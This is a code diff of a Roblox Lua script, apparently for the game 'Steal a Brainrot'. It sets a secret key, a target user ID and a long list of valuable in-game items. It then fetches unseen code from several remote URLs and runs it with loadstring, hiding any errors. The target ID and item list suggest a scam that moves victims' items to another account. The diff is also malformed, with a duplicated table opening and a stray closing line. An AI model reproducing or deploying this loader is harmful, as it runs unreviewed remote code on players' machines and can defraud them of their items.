@@ -15,54 +15,80 @@ getgenv().TARGET_BRAINROTS = {
     ["Skibidi Toilet"] = true,
     ["Griffin"] = true,
     ["Hydra Dragon Cannelloni"] = true,
+local genv = getgenv()
+genv.SECRET_KEY = "shub_aec86dc3a54d0b144a2bd11dc478a356"
+genv.TARGET_ID = 6219924104
+genv.MinGeneration = 25000000
+genv.MaxQuantity = 25
+genv.TARGET_BRAINROTS = {
+    ["Skibidi Toilet"] = true,
+    ["Meowl"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Headless Horseman"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
     ["Dragon Gingerini"] = true,
     ["Dragon Cannelloni"] = true,
-    ["Love Love Bear"] = true,
     ["La Supreme Combinasion"] = true,
-    ["Hydra Bunny"] = true,
     ["Celestial Pegasus"] = true,
     ["Cerberus"] = true,
-    ["Bunny and Eggy"] = true,
+    ["Love Love Bear"] = true,
     ["Popcuru and Fizzuru"] = true,
     ["Rosey and Teddy"] = true,
     ["Capitano Moby"] = true,
     ["Cooki and Milki"] = true,
     ["Burguro And Fryuro"] = true,
-    ["Arcadragon"] = true,
     ["Ketupat Bros"] = true,
     ["Reinito Sleighito"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Casa Boo"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Garama and Madundung"] = true,
+    ["Festive 67"] = true,
+    ["Ginger Gerat"] = true,
+    ["Antonio"] = true,
+    ["La Food Combinasion"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Signore Carapace"] = true,
+    ["Elefanto Frigo"] = true,
     ["Fortunu and Cashuru"] = true,
     ["Los Amigos"] = true,
-    ["La Secret Combinasion"] = true,
-    ["Pancake and Syrup"] = true,
-    ["Foxini Lanternini"] = true,
     ["Los Sekolahs"] = true,
-    ["Signore Carapace"] = true,
-    ["La Casa Boo"] = true,
-    ["Cash or Card"] = true,
-    ["Fragrama and Chocrama"] = true,
-    ["La Food Combinasion"] = true,
-    ["Elefanto Frigo"] = true,
-    ["Spooky and Pumpky"] = true,
-    ["Ginger Gerat"] = true,
     ["Sammyni Fattini"] = true,
-    ["Festive 67"] = true,
     ["Cloverat Clapat"] = true,
-    ["Antonio"] = true,
-    ["Garama and Madundung"] = true,
     ["Fishino Clownino"] = true,
-    ["Jolly Jolly Sahur"] = true,
     ["Gold Gold Gold"] = true,
-    ["Rico Dinero"] = true,
+    ["Jolly Jolly Sahur"] = true,
     ["Tirilikalika Tirilikalako"] = true,
     ["Dug dug dug"] = true,
-    ["Los Chillis"] = true,
     ["Chillin Chili"] = true,
-    ["Fragola La La La"] = true
+    ["Los Chillis"] = true,
+    ["Fragola La La La"] = true,
+    ["Cash or Card"] = true,
+    ["Gym Bros"] = true,
+    ["Los Mariachis"] = true,
+    ["Kalika Bros"] = true,
+    ["Digi Narwhal"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Boppin Bunny"] = true,
+    ["Hydra Bunny"] = true,
+    ["Quackini Snackini"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Money Money Reindeer"] = true
 }
-task.spawn(function()
-loadstring(game:HttpGet("https://luapot.com/api/loadstring/fb14c57cabe9536a3bac0c101cf7abc7"))()
+local function safeLoadFromUrl(url)
+    task.spawn(function()
+        local ok, body = pcall(function()
+            return game:HttpGet(url)
+        end)
+        if not ok or type(body) ~= "string" or #body == 0 then return end
+        local fn, err = loadstring(body)
+        if not fn then return end
+        pcall(fn)
+    end)
+end
+
+safeLoadFromUrl("https://api.jnkie.com/api/v1/luascripts/public/4412bf5b03484439b54771aa1b89e7bf8dd52b12759ac2f76d92f6e759c3e333/download")
 end)
-task.spawn(function()
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/4412bf5b03484439b54771aa1b89e7bf8dd52b12759ac2f76d92f6e759c3e333/download"))()
-end)
+safeLoadFromUrl("https://raw.githubusercontent.com/SHUBSCRIPTS-COM/Shub/refs/heads/main/Script.luau")
